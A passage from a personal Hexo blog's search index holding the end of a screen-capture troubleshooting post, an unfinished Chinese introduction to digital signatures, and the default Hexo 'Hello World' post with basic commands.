type="1"><li><p>1.&lt;easyx.h&gt;头文件没有，可以在网上下载这个库。</p></li><li><p>2.代码标红出错，配置没有调对。</p></li><li><p>3.屏幕尺寸不对，可以通过修改代码调试，如果抓取的屏幕不完整，可能是被抓取的屏幕没有按照100％显示。</p></li><li><p>4.有关路径按自身电脑配置。</p></li><li><p>5.最后生成解决方案后可以到Debug问下下找到.exe文件。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数字签名</title>
    <link href="/2022/06/24/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <url>/2022/06/24/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="digital-signature">Digital Signature</h1><ol type="1"><li>数字签名概述</li><li>RSA数字签名算法</li><li>DSA数字签名算法</li><li>ECDSA数字签名算法 <span id="more"></span> ## 一、数字签名概述</li></ol><h3 id="手书签名的作用和目的">1、手书签名的作用和目的</h3><p>（1）表示签名者对消息的认可；</p><p>（2）他人可识别和验证出是谁的签名；</p><p>（3）他人无法伪造和更改签名，即</p><p>​ （A）无法凭空造出一个签名；</p><p>​ （B)对一个文件的签名不能复制或篡改称对另一个文件的签名；</p><p>（4）可仲裁性：出现争议时第三方可仲裁；</p><p>仲裁内容：</p><p>​ （1）签名者是否在抵赖，否认签名；</p><p>​ （2）验证者是否在欺诈，伪造签名；</p><p>签名的实现方式：</p><p>​ 就是在原文件上追加一定的笔记信息，并使二者形成一个整体。</p><h3 id="数字签名应满足的条件">2.数字签名应满足的条件</h3><p>（1）签名与文件是一个不可分割的整体；</p><p>实现：对消息进行某种变换完成签名；使签名是待签名的文件的函数。</p><p>（2）签名者事后不能否认自己的签名；</p><p>实现：签名是通过发方所独有的秘密信息来完成，并且该秘密信息对应惟一公开的验证信息，使签名者不能抵赖自己的签名。</p><p>（3）接受者能验证签名，而任何人都不可以伪造签名：</p><p>实现：签名必须与特定的公开信息相对应，使接收方能够验证；签名应与签名者独有的秘密信息密切相关，使其他人不能伪造。</p><p>（4）当双方关于签名的真伪发生争执时，一个法官或第三方能解决双方之间发生的争执。</p><p>实现：签名对应的验证密钥应由可信的第三方确认并公布。当发生争执时，靠法律解决争端。</p><h3 id="数字签名方案的分类">3.数字签名方案的分类</h3><p>（1）利用特殊的公钥加密算法实现。</p><p>并非所有的公钥加密算法都能实现数字签名，只有满足 <spanclass="math display">\[D_{k_{d}}\left(E_{k_{e}}(x)\right)=E_{k_{e}}\left(D_{k_{d}}(x)\right)=x\]</span>的公钥密码算法，才能实现数字签名。其中D是脱密算法，E是加密算法。</p><p>（2）利用专门设计的数字签名算法实现。</p>###<center>基于公钥算法设计的数字签名</center><p>未完待续......</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/06/22/hello-world/"/>
    <url>/2022/06/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><p><span id="more"></span> ### Create a new post</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
